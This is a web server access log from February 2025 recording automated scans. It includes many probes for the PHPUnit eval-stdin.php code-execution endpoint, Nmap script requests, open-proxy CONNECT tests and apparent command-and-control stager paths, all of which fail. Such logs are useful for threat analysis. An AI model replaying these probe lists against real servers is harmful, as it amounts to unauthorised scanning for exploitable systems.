193.68.89.10 - - [14/Feb/2025:23:52:03 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:00:13:37 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [15/Feb/2025:00:38:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:00:54:43 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
185.12.59.118 - - [15/Feb/2025:01:13:12 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD08-h]\x01\xDD\x06\xF8a\xAB\xFD\x17\x14\x83\xDE\x93\xE4\xD21\xA3\xE8:V\x02\xBA\xE9\xDD\xBF\xC2\xDA,\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
196.251.91.10 - - [15/Feb/2025:01:21:50 +0000] "CONNECT 45.61.137.126:7227 HTTP/1.1" 400 157 "-" "-"
193.68.89.10 - - [15/Feb/2025:01:46:54 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:01:50:00 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [15/Feb/2025:02:21:58 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.143.26 - - [15/Feb/2025:02:27:36 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
141.255.166.90 - - [15/Feb/2025:02:31:27 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 153 "-" "-"
193.68.89.51 - - [15/Feb/2025:02:34:18 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
109.205.213.198 - - [15/Feb/2025:02:49:24 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
188.62.117.171 - - [15/Feb/2025:02:55:27 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
61.26.174.69 - - [15/Feb/2025:03:11:03 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "GET /nmaplowercheck1739589082 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "POST /sdk HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "GET /evox/about HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.32 - - [15/Feb/2025:03:11:22 +0000] "GET /HNAP1 HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
104.152.52.32 - - [15/Feb/2025:03:11:23 +0000] "GET / HTTP/1.0" 200 135 "-" "-"
104.152.52.32 - - [15/Feb/2025:03:11:23 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
205.210.31.162 - - [15/Feb/2025:03:22:46 +0000] "GET / HTTP/1.0" 200 135 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
193.68.89.51 - - [15/Feb/2025:03:32:05 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
185.93.89.118 - - [15/Feb/2025:03:35:17 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:18 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:20 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:22 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:24 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:26 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:28 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:29 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:31 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:33 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:35 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:37 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:39 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:41 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:43 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:44 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:46 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:48 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:50 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:52 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:54 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:56 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:35:58 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:00 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:01 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:03 +0000] "GET /all/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:05 +0000] "GET /advanced/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:07 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:09 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:11 +0000] "GET /back/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:13 +0000] "GET /backend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:15 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:17 +0000] "GET /beta/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:19 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:20 +0000] "GET /blog/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:22 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:24 +0000] "GET /config/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:26 +0000] "GET /core/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:28 +0000] "GET /core/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:30 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:32 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:34 +0000] "GET /dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:36 +0000] "GET /develop/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:37 +0000] "GET /ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:39 +0000] "GET /ecc/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:41 +0000] "GET /git/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:43 +0000] "GET /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:45 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:47 +0000] "GET /laravel_api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:49 +0000] "GET /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:50 +0000] "GET /live/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:52 +0000] "GET /local/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:54 +0000] "GET /modules/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:56 +0000] "GET /new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:36:58 +0000] "GET /old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:00 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:02 +0000] "GET /pid/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:04 +0000] "GET /pkm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:05 +0000] "GET /pms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:07 +0000] "GET /portal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:09 +0000] "GET /pos/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:11 +0000] "GET /pos/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:13 +0000] "GET /production/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:15 +0000] "GET /production/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:16 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:18 +0000] "GET /server/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:20 +0000] "GET /site/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:22 +0000] "GET /workspace/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
185.93.89.118 - - [15/Feb/2025:03:37:24 +0000] "GET /web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0"
172.169.5.249 - - [15/Feb/2025:03:58:18 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03$\xDD\x8E\x10*\xB0\xE2\xDA\xA9[L\xC1\x8A\x12i\x18\xB6\xF2\x9Bbi\x1D\xC3\x8C\xC2\xA8\xFF]H\xA2\xC3\xC8\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
78.108.177.50 - - [15/Feb/2025:04:01:27 +0000] "GET / HTTP/1.0" 200 135 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)"
46.19.143.58 - - [15/Feb/2025:04:11:54 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.246.87.21 - - [15/Feb/2025:04:14:02 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.169.111.159 - - [15/Feb/2025:04:31:13 +0000] "MGLNDD_193.93.76.135_8080" 400 157 "-" "-"
193.68.89.51 - - [15/Feb/2025:04:35:44 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [15/Feb/2025:05:02:07 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:05:10:04 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.105.70.190 - - [15/Feb/2025:05:15:30 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 zgrab/0.x"
46.19.143.58 - - [15/Feb/2025:06:04:34 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:06:05:09 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
146.190.252.31 - - [15/Feb/2025:06:15:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_\xF4\x1D2g\xBA\x92{q;\x8E\x15\xAA\xF5\xCE*\xFDr\xE1\xCE\x8D\xC0\xB1)sX\xC1`\xD7\xF8\xDB\x1C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
146.190.252.31 - - [15/Feb/2025:06:15:23 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF5\xED\xAB2L\x0F\xD8\xE68\x07\x1E\x0E\xFF\x96\xECKD" 400 157 "-" "-"
146.190.252.31 - - [15/Feb/2025:06:15:23 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.190.252.31 - - [15/Feb/2025:06:15:24 +0000] "GET /download/powershell/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
146.190.252.31 - - [15/Feb/2025:06:15:24 +0000] "GET /get.php HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
222.216.206.99 - - [15/Feb/2025:06:53:24 +0000] "GET / HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
193.68.89.10 - - [15/Feb/2025:06:56:58 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:07:03:33 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
46.19.143.58 - - [15/Feb/2025:07:52:57 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:07:54:45 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.10 - - [15/Feb/2025:08:33:12 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:08:39:13 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
193.68.89.51 - - [15/Feb/2025:09:19:07 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
64.62.197.202 - - [15/Feb/2025:09:29:15 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/109.0"
64.62.197.208 - - [15/Feb/2025:09:29:46 +0000] "GET /favicon.ico HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.2.987 Yowser/2.5 Safari/537.36"
64.62.197.197 - - [15/Feb/2025:09:30:02 +0000] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 146 "-" "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
64.62.197.209 - - [15/Feb/2025:09:30:10 +0000] "CONNECT www.shadowserver.org:443 HTTP/1.1" 400 157 "-" "-"
64.62.197.208 - - [15/Feb/2025:09:30:29 +0000] "GET /geoserver/web/ HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 10.0; rv:108.0) Gecko/20100101 Firefox/108.0"
46.19.143.58 - - [15/Feb/2025:09:50:34 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.68.89.51 - - [15/Feb/2025:09:58:24 +0000] "GET / HTTP/1.1" 200 146 "-" "-"
112.46.212.24 - - [15/Feb/2025:09:59:05 +0000] "GET / HTTP/1.1" 400 157 "-" "-"
85.90.246.159 - - [15/Feb/2025:10:01:31 +0000] "+\xFF1\xBC\x90\x81\xEE{\x91\x94$v\x1A\x84\x13\xB4\xB6\x1E\xE4bb\x17\xB1\x91\xDB\xDC\xBC\xDC\x8AE\xA9" 400 157 "-" "-"
193.68.89.10 - - [15/Feb/2025:10:15:21 +0000] "GET / HTTP/1.1" 200 124 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
